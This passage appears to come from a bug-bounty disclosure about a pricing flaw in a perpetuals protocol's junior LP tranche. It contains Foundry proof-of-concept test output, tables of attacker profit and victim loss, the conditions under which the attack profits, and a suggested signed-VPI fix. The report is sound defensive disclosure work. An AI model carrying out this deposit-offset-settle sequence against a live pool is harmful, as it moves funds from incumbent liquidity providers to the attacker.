        _compare(Cfg({attackerShareOfJuniorPct: 75, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    function test_sens_50pct_25skew() public {
        _compare(Cfg({attackerShareOfJuniorPct: 50, carolSkewPct: 25, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    function test_sens_50pct_10skew() public {
        _compare(Cfg({attackerShareOfJuniorPct: 50, carolSkewPct: 10, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    function test_sens_75pct_25skew() public {
        _compare(Cfg({attackerShareOfJuniorPct: 75, carolSkewPct: 25, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    function test_sens_75pct_10skew() public {
        _compare(Cfg({attackerShareOfJuniorPct: 75, carolSkewPct: 10, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 0, attackerOffsetPct: 100}));
    }

    /// Redemption-side variant: bob redeems 50% of his shares in the attacked settlement.
    function test_variant_bobRedeemsInAttackedSettlement() public {
        _compare(Cfg({attackerShareOfJuniorPct: 50, carolSkewPct: 39, seniorDeposit: 2_000_000e6, bobRedeemAtAttackBps: 5_000, attackerOffsetPct: 100}));
    }
}
```

Output of the main case and the suite result:

```
Ran 10 tests for test/perps/T_vpi_mirror_RebateUnderstatement.t.sol:T_vpi_mirror_RebateUnderstatement
[PASS] test_main_50pct_40skew() (gas: 44966095)
Logs:
  === cfg: attacker share of junior %, carol skew % depth, bob redeem bps
  50 39 0
  ATTACK
    attacker deposit: 1000999899493
    carol notional (1e18): 1170700000000000000000000
    carol vpiAccrued:
  2282709010
    attacker vpiAccrued at open (neg = rebate R):
  -2280974566
    junior price at attacked settlement (1e18): 999974203152042
    attacker shares: 1001025722801373
    attacker redemption: 1002122130747
    attacker LP leg delta:
  1122231254
    attacker trader leg delta (fees+carry+VPI net):
  -936577624
    attacker net (LP+trader):
  185653630
    treasury delta: 936560000
    bob payout in attacked settlement: 0
    bob remaining value end: 1001104426573
    carol trader wealth end: 197249010990
    senior principal end: 2001054973522
    junior principal end: 1002105521858
  CTRL_A (no attacker position)
    attacker deposit: 1000999899493
    carol notional (1e18): 1170700000000000000000000
    carol vpiAccrued:
  2282709010
    attacker vpiAccrued at open (neg = rebate R):
  0
    junior price at attacked settlement (1e18): 1002252878233908
    attacker shares: 998749837722476
    attacker redemption: 1000981645998
    attacker LP leg delta:
  -18253495
    attacker trader leg delta (fees+carry+VPI net):
  0
    attacker net (LP+trader):
  -18253495
    treasury delta: 0
    bob payout in attacked settlement: 0
    bob remaining value end: 1002243754381
    carol trader wealth end: 197249010990
    senior principal end: 2001054973522
    junior principal end: 1003245988983
  CTRL_B (open+close before settlement)
    attacker deposit: 1000999899493
    carol notional (1e18): 1170700000000000000000000
    carol vpiAccrued:
  2282709010
    attacker vpiAccrued at open (neg = rebate R):
  -2280974566
    junior price at attacked settlement (1e18): 1002254616127144
    attacker shares: 998748105906469
    attacker redemption: 1000981646014
    attacker LP leg delta:
  -18253479
    attacker trader leg delta (fees+carry+VPI net):
  -938299647
    attacker net (LP+trader):
  -956553126
    treasury delta: 936560000
    bob payout in attacked settlement: 0
    bob remaining value end: 1002245492274
    carol trader wealth end: 197249010990
    senior principal end: 2001054973522
    junior principal end: 1003247728614
  SUMMARY attacker net ATTACK - CTRL_A:
  203907125
  SUMMARY attacker net ATTACK - CTRL_B:
  1142206756
  SUMMARY bob total (payout+remaining) CTRL_A - ATTACK:
  1139327808
  SUMMARY carol wealth ATTACK - CTRL_A:
  0
  SUMMARY senior principal ATTACK - CTRL_A:
  0
  SUMMARY attacker LP leg ATTACK - CTRL_A:
  1140484749

[PASS] test_partialOffset_75pct_40skew_half() (gas: 44988153)
[PASS] test_positiveOnlyFixLeavesTheGap() (gas: 45122370)
[PASS] test_sens_10pct_40skew() (gas: 44963735)
[PASS] test_sens_50pct_10skew() (gas: 44948041)
[PASS] test_sens_50pct_25skew() (gas: 44981275)
[PASS] test_sens_75pct_10skew() (gas: 44948479)
[PASS] test_sens_75pct_25skew() (gas: 44981713)
[PASS] test_sens_75pct_40skew() (gas: 44964046)
[PASS] test_variant_bobRedeemsInAttackedSettlement() (gas: 48330433)
Suite result: ok. 10 passed; 0 failed; 0 skipped; finished in 256.09ms (1.52s CPU time)

Ran 1 test suite in 260.34ms (256.09ms CPU time): 10 tests passed, 0 failed, 0 skipped (10 total tests)
```

The full output of all ten tests is attached as `poc-output.txt`.

### What each test shows

Each test runs ATTACK, CTRL_A and CTRL_B from the same snapshot, at the same timestamps and a constant price of 1.00.

- `test_main_50pct_40skew` asserts that the attacker received a rebate, that the attacked settlement is priced below the control, that the attacker ends richer than it started and richer than in CTRL_A, that the incumbent junior LP ends poorer, and that the honest trader and Senior are identical across arms.
- `test_positiveOnlyFixLeavesTheGap` asserts that after subtracting only positive `vpiAccrued` the attacked settlement is still priced `R` low and the transfer remains, and that the signed rule removes it.
- `test_partialOffset_75pct_40skew_half` repeats the attack with half the offsetting size.
- `test_sens_*` log the six cells of the sensitivity table, including the cells where the attacker loses.
- `test_variant_bobRedeemsInAttackedSettlement` logs the cash underpayment of an honest redeemer in the attacked settlement.

## Impact

All numbers are USDG with 6 decimals; atoms are 1e-6 USDG. The setup:
- release parameters, set through the timelocked admin paths and asserted;
- constant basket price 1.00 with zero confidence;
- Senior LP deposit 2,000,000, Junior incumbent (bob) 1,000,000, each tranche plus the fixture seed;
- economic depth about 3,002,000;
- carol's LONG of 1,170,700 notional, 39 % of depth, open in every arm.

There are three arms, all with identical timestamps:
- **ATTACK**: the steps above.
- **CTRL_A**: the same deposit, settlement and redemption, with no attacker position.
- **CTRL_B**: the same open and close, but the close runs before the settlement.

#### Main case: attacker 50 % of Junior, skew 39 % of depth

| Quantity | ATTACK | CTRL_A | CTRL_B |
|---|---:|---:|---:|
| carol `vpiAccrued` (atoms) | 2,282,709,010 | 2,282,709,010 | 2,282,709,010 |
| attacker `vpiAccrued` at open (−R) | −2,280,974,566 | 0 | −2,280,974,566 |
| Junior price at the attacked settlement (1e18) | 0.999974203152042 | 1.002252878233908 | 1.002254616127144 |
| attacker deposit | 1,000,999.899493 | 1,000,999.899493 | 1,000,999.899493 |
| attacker redemption | 1,002,122.130747 | 1,000,981.645998 | 1,000,981.646014 |
| attacker LP leg (redemption − deposit) | +1,122.231254 | −18.253495 | −18.253479 |
| attacker trader leg (execution fees and carry; VPI nets to zero) | −936.577624 | 0 | −938.299647 |
| protocol treasury received (execution fees) | 936.560000 | 0 | 936.560000 |
| attacker total, end − start | **+185.653630** | −18.253495 | −956.553126 |
| bob's Junior value at end | 1,001,104.426573 | 1,002,243.754381 | 1,002,245.492274 |
| carol's trader wealth at end | 197,249.010990 | 197,249.010990 | 197,249.010990 |
| Senior principal at end | 2,001,054.973522 | 2,001,054.973522 | 2,001,054.973522 |

- Attacker, ATTACK − CTRL_A: **+203.907125**. ATTACK − CTRL_B: +1,142.206756.
- Attacker LP leg, ATTACK − CTRL_A: +1,140.484749. bob, CTRL_A − ATTACK: **−1,139.327808**.
- bob's loss equals the attacker's LP-leg gain within 1.16 USDG of rounding and carry. The attacker's net is that gain minus the execution fees paid to the treasury.
- carol and Senior differ by 0 atoms between arms. The transfer is from Junior to Junior.
- The −18.25 USDG in CTRL_A is the Senior coupon the attacker's Junior shares bear over two hours, as in any deposit.

#### Sensitivity (attacker ATTACK − CTRL_A; bob's loss CTRL_A − ATTACK)

| Attacker share of Junior \ skew | 10 % (R = 150.092495) | 25 % (R = 937.831927) | 39 % (R = 2,280.974566) |
|---|---:|---:|---:|
| 10 % | n/m | n/m | −708.483995 (bob −227.848159) |
| 50 % | −165.114848 (bob −74.970182) | −131.491775 (bob −468.439790) | **+203.907125** (bob −1,139.327808) |
| 75 % | −127.591324 (bob −112.456221) | **+102.969181** (bob −702.666521) | **+774.158490** (bob −1,709.009497) |

Every cell fits the following model:
- `R = vpiFactor * S² / (2D)` for a full offset of skew `S` at depth `D`.
- The attacker gains `f * R`.
- The attacker pays `2 * 4 bps * size` in execution fees (open and close). Carry is under 0.02 USDG.

The attack is profitable when `S / D > 0.16 / f`. Because `S ≤ 0.4 D`, the amount moved in one attacked settlement is at most `R ≤ 0.0008 D` (0.08 % of depth). In the 75 % / 39 % cell the attacker's end − start total is +746.762772.

#### Partial offset: attacker short = 50 % of carol's size, 75 % share, 39 % skew

| Quantity | ATTACK | CTRL_A | CTRL_B |
|---|---:|---:|---:|
| attacker `vpiAccrued` at open (−R) | −1,710,633,501 | 0 | −1,710,633,501 |
| Junior price at the attacked settlement (1e18) | 1.000543969247794 | 1.002252878233907 | 1.002253853293943 |
| attacker deposit / redemption | 3,002,999.698479 / 3,004,255.091400 | 3,002,999.698479 / 3,002,972.302761 | 3,002,999.698479 / 3,002,972.302768 |
| attacker total, end − start | **+787.149419** | −27.395718 | −496.611755 |
| treasury received | 468.240000 | 0 | 468.240000 |
| bob's value at end | 1,000,971.383826 | 1,002,252.887471 | 1,002,253.862533 |

Attacker ATTACK − CTRL_A: **+814.545137**. bob's loss: 1,281.503645. With half the size, `R` falls only to 75 % (`S² − (S − a)²`) while fees halve, so a partial offset is slightly better for the attacker than a full one (+774.158490).

#### Redemption side: bob redeems 50 % of his shares in the attacked settlement (attacker 50 %, skew 39 %)

| Quantity | ATTACK | CTRL_A | CTRL_B |
|---|---:|---:|---:|
| bob's cash payout in the attacked settlement | 499,991.667499 | 501,131.015445 | 501,131.884399 |
| bob's remaining value at end | 500,738.811304 | 501,118.830579 | 501,119.699520 |
| attacker total, end − start | +559.228207 | −24.339045 | −962.638678 |

bob's cash payout is 1,139.347946 USDG lower than in CTRL_A, and his total loss is 1,519.367221. The attacker is +583.567252 against CTRL_A, because the shortfall paid to the redeemer also stays with the remaining Junior holders, most of whom are the attacker.

#### The positive-only fix leaves this issue open; the signed fix closes it

The test computes, without changing any source, what the attacked settlement would price under two alternative reconcile rules. It uses the measured pricing assets and supply at that settlement and the positions' `vpiAccrued`. While the Senior claim is covered, subtracting an amount `X` from `distributable` lowers the Junior residual by exactly `X`. The attacker's shares are then re-priced and redeemed at the corresponding redemption value. A sanity check reproduces the measured current-code redemptions with 0 atoms difference in ATTACK and CTRL_A.

| Rule at the attacked settlement | ATTACK | CTRL_A | CTRL_B (post-close) |
|---|---:|---:|---:|
| Junior pricing assets, current code | 1,000,983.309203 | 1,003,264.283769 | 1,003,266.023416 |
| Junior price, current code (1e18) | 0.999974203152041 | 1.002252878233909 | 1.002254616127145 |
| Junior price, positive-only fix `− Σ max(vpiAccrued, 0)` (1e18) | 0.997693795374693 | 0.999972470456560 | 0.999974208349796 |
| Junior price, signed fix `− Σ vpiAccrued` (1e18) | 0.999972470456560 | 0.999972470456560 | 0.999974208349796 |

- **Positive-only fix.** Junior pricing assets at the attacked settlement remain 2,280,974,566 atoms (exactly `R`) below CTRL_A, and 2,282,714,213 atoms below the post-close CTRL_B. The fix subtracts carol's positive accrual equally in every arm and does nothing for the attacker's negative accrual. The attacker's emulated LP-leg gain over CTRL_A is **1,141.786617 USDG**, against 1,140.484749 under the current code.
- **Signed fix.** ATTACK and CTRL_A price at the same Junior assets (difference 0 atoms). The attacker's emulated LP-leg gain over CTRL_A is 0.008812 USDG, which is rounding.

#### Mapping to the program row

Critical "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield": junior LP principal held in HousePool moves to the attacker through public calls. In the profit region the attacker ends with more than it started and more than in either control, and the incumbent junior LP ends with less. Outside the profit region the incumbent still loses `f * R` but the attacker pays more in fees than it gains; that part is griefing.

## Limits

- **Likelihood.** Conditional. It needs a standing directional skew from other traders above about `0.16 / f` of pool depth, where `f` is the attacker's share of Junior after its deposit. That is above 32 % at f = 0.5 and above 21 % at f = 0.75. It is never profitable at f = 0.1 because the skew cap is 40 %. Every step is permissionless.
- **Parameters.** Release defaults (`script/DeployPerpsArbitrumSepolia.s.sol:434-447`, `packages/perps/DEPLOYMENT.md:129-155`, `HousePool.sol:251`): `vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `maintMarginBps 10`, `initMarginBps 20`, `executionFeeBps 4`, `settlementBufferBps 25`, `maxSeniorShareBps 8_000`, `maxSeniorExposureAssets 40_000_000e6`, `seniorRateBps 800`
- **Profit region.** The attacker profits only when the existing skew is above about `0.16 / f` of depth. Measured: 50 % share at 39 % skew; 75 % share at 25 % and 39 %. At 10 % share it is never profitable (cap 40 %). Outside that region the same steps still move `f * R` away from incumbent Junior LPs, but the attacker pays more in fees than it gains. That is griefing at the attacker's own cost.
- **Size per settlement.** The transfer is at most `R ≤ 0.0008 D` per attacked settlement, plus `f * R` to the attacker. In the test (D about 3,002,000 USDG): attacker +203.91 to +814.55 USDG against control, incumbents −1,139.33 to −1,709.01 USDG. The attacker needs to hold most of Junior after its deposit. Larger pools scale linearly in the model (at D = 50M, R ≤ 40,000 USDG per settlement); this was not run. The sequence can repeat in any epoch where an eligible skew exists.
- **Two honest users.** An honest skew-reducing trader who happens to hold a position across a settlement causes the same understatement, and an honest depositor in that settlement receives the same windfall by chance. The attacker's version needs no event outside its control. It observes the skew beforehand and opens, settles and closes itself within seconds. The confirmed positive-VPI issue has the same property.
- **Price exposure.** The short is open for seconds to minutes between open and close. The test holds the price constant. Real exposure is zero-mean variance and can be hedged outside the protocol. Hedging inside the protocol through a second account does not work, because that account's skew-increasing open pays positive VPI, which is counted in NAV and cancels `R`.
- **Fees.** Execution fees go to the protocol treasury, not to LPs, so incumbents are not compensated by the attacker's costs.

### Relation to the confirmed positive-VPI report

The program has confirmed, as Critical, a report that a positive VPI charge is counted as Junior equity by the same `buildReconcileSnapshot`. That charge is paid by a skew-increasing open and refundable at close, so an LP who is also a trader could redeem at an inflated price. That report suggested subtracting the sum of positive `vpiAccrued` over open positions from `distributable`, and noted that negative VPI already has a dedicated reserve.

This report concerns the opposite sign of the same per-position record (`StoredPosition.vpiAccrued`) at the same site. It is not fixed by that suggestion:

- **Fix coverage.** As measured above, after the positive-only subtraction the attacked settlement is still priced exactly `R` low, and the attacker's transfer is unchanged (1,141.786617 against 1,140.484749 USDG). The dedicated reserve protects the clearinghouse claim on `R`. It does not put `R` into LP pricing, and that omission is the defect here. Only a signed treatment closes both directions: subtract positive accruals and add back the reserve-backed negative accruals, which is the same as subtracting the signed sum.
- **Direction.** The positive case overprices redemptions; the redeemer takes value from those who stay. This case underprices the settlement, so a depositor takes value from incumbent Junior LPs, and honest redeemers in that settlement are paid too little in cash.
- **Actor and preconditions.** The positive case needs the attacker's own skew-increasing open. This case needs a standing skew created by other traders, which the attacker offsets. The profit condition (`S / D > 0.16 / f`) is set by that skew and by the attacker's share of Junior.
- **Victims at the moment of harm.** Here the victims are incumbent Junior holders at the attacked settlement and honest redeemers in it, not the LPs who remain after an overpriced exit.

### Documentation and design intent

The documentation describes the reserve and its exclusion from LP NAV:

- `packages/perps/SECURITY.md:869-872`: "new close-time action rebates use only pool cash free after protecting existing trader claims. Unfunded value is waived rather than claim-backed, and neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV".
- `packages/perps/SECURITY.md:866-868`: "gross negative lifetime VPI is backed by a dedicated nonwithdrawable reserve equal to `max(-vpiAccrued, 0)` ...".
- `packages/perps/SECURITY.md:863`: "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book".
- `packages/perps/ACCOUNTING_SPEC.md:821-822`: "VPI reserve is nonwithdrawable, cannot fund generic action charges, and cannot be extracted by LPs before its account obligation settles".
- `packages/perps/ACCOUNTING_SPEC.md:1064-1066`: "anticipated carry, VPI, fees, spreads, and other action economics stay outside terminal `K` ... The VPI reserve therefore does not inflate marked LP receivables or symmetric LP NAV".
- `packages/perps/WHITEPAPER.md:887-888`: "The reserve is excluded from the terminal price curve, so LPs cannot withdraw it as marked equity before the matching position obligation settles."
- The "VPI limitations" list (`packages/perps/SECURITY.md:1434-1444`) covers liquidation clawback from the reserve, depth, zero-depth closes, the clamp in all regimes, frozen spread, "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips", and the partial-close approximation. It says nothing about LP pricing while a negative accrual is open.

What these sentences establish:
- The reserve must not *inflate* NAV.
- LPs must not withdraw it as equity before the obligation settles.

Both are conservatism statements against overpaying LP exits. They do not say:
- that LP deposits may be priced below the value the reserve guarantees will return to the pool;
- that a deposit timed inside the window is accepted to dilute incumbent LPs by `R`.

The same document set states the entry-side principle for marked values. `SECURITY.md:850-851`: "LP entry and exit pricing consume the same authenticated terminal snapshot"; `:859-860`: "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV". For price receivables it uses a model that meets the withdrawal concern without mispricing ownership. `:862`: "marked receivables affect ownership pricing but remain unavailable to fund redemptions until physically collected".

`R` is a fixed amount, fully pre-funded in the clearinghouse and contractually returned by the clamp. Under the documented receivable model it would affect ownership pricing while staying unavailable to fund redemptions.


## Suggested fix

In `HousePoolAccountingLib.buildReconcileSnapshot`, treat lifetime VPI with its sign:
- add the reserve-backed negative accruals, `Σ max(-vpiAccrued, 0)` (equal to the sum of the clearinghouse VPI reserves), as a terminal receivable;
- and, for the confirmed positive case, subtract `Σ max(vpiAccrued, 0)`.

This is the same as subtracting the signed aggregate `Σ vpiAccrued` from `distributable`. If the protocol wants to keep the reserve out of redemption cash until the close, it can follow the existing receivable model: count it in ownership pricing for both entry and exit, while withdrawal and free-cash limits keep excluding it. The test shows the signed rule removes the transfer (0 atoms pricing difference, 0.008812 USDG of rounding in the attacker's result).

